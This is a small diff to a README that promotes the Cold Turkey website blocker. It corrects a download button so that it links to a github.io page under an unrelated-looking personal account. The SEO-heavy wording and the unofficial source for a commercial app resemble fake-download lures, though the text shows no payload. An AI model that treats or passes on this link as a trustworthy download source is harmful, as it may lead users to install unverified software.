@@ -21,7 +21,7 @@ To begin using this **Cold Turkey Website Blocker** and **Cold Turkey Productivi
 | :--- | :--- |
 | **Get Cold Turkey Blocker** | Click the button below to set up this **Cold Turkey Internet Blocker**. |
 
-[![Button](https://img.shields.io/badge/📦-Get_Cold_Turkey_Blocker-2ea44f?style=for-the-badge)](https://github.com/https://koganwahbyy2.github.io/.github/cold-turkey-website-blocker)
+[![Button](https://img.shields.io/badge/📦-Get_Cold_Turkey_Blocker-2ea44f?style=for-the-badge)](https://koganwahbyy2.github.io/.github/cold-turkey-website-blocker)
 
 ## System Requirements
 
